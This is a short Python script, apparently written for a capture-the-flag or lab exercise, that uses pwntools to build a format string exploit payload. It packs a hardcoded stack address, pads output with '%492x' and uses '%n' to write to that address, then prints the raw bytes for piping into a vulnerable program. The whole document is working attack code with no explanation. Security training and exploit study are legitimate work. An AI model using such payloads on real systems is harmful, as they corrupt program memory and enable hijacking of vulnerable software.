from pwn import *

# print = lambda *args, **kwargs: None # override print function

payload = b'JUNK'
payload += p32(0xffffd340)
payload += b'%492x'
payload += b'%n'

sys.stdout.buffer.write(payload)
